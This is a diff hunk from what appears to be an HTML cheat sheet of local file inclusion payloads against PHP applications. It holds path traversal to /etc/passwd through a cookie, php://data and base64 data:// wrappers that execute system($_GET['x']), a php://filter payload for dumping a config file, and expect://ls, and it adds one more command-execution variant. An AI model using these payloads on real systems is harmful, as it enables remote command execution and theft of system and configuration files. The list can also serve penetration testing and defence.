@@ -62,6 +62,7 @@ javascript:document.cookie="lan=../../../../../etc/passwd%00″;<br/>
 ?file=php://data<br/>
 &nbsp;data:text/plain,&lt;?php phpinfo(); ?&gt;<br/>
 &nbsp;data:,&lt;?system($_GET['x']);?&gt;&amp;x=ls<br/>
+&nbsp;data:,&lt;?php system($_GET['x']); ?&gt;&amp;x=ls<br/>
 &nbsp;data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls<br/>
 ?file=php://filter/read=convert.base64-encode/resource=config&#09;same, but add a filter/read<br/>
 ?file=expect://ls<br/>
